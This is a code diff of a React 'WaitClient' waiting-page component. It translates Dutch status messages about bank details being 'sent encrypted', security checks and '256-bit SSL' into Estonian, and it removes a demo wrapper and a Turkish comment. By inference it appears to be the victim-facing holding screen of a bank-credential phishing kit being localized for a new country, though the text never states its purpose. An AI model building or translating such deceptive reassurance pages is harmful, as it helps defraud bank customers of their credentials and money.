@@ -1,7 +1,6 @@
 "use client";
 
 import { useEffect, useState } from "react";
-import { DemoShell } from "@/components/demo/DemoShell";
 import { useSettings } from "@/contexts/SettingsContext";
 
 type Props = {
@@ -9,18 +8,17 @@ type Props = {
 };
 
 const MESSAGES = [
-  "Beveiligde verbinding wordt opgezet...",
-  "Bankgegevens worden versleuteld verzonden...",
-  "Veiligheidscontrole wordt uitgevoerd...",
-  "Een ogenblik geduld alsjeblieft...",
-  "Verbinding wordt geautoriseerd..."
+  "Turvalist ühendust luuakse...",
+  "Pangaandmeid saadetakse krüpteeritult...",
+  "Turvakontrolli teostatakse...",
+  "Palun oota hetk...",
+  "Ühendust autoriseeritakse..."
 ];
 
 export function WaitClient({ sessionId }: Props) {
   const { settings, loading: settingsLoading } = useSettings();
   const [messageIndex, setMessageIndex] = useState(0);
 
-  // YazÄ±larÄ± periyodik olarak deÄŸiÅŸtir
   useEffect(() => {
     const messageTimer = setInterval(() => {
       setMessageIndex((prev) => (prev + 1) % MESSAGES.length);
@@ -51,7 +49,7 @@ export function WaitClient({ sessionId }: Props) {
         {!sessionId ? (
           <div className="flex justify-center relative z-10 w-full">
             <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-600 shadow-sm w-full max-w-sm">
-              Ongeldige link.
+              Vigane link.
             </p>
           </div>
         ) : (
@@ -101,7 +99,7 @@ export function WaitClient({ sessionId }: Props) {
               <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
               </svg>
-              256-bit SSL versleuteling
+              256-bitine SSL-krüpteering
             </div>
           </div>
         )}
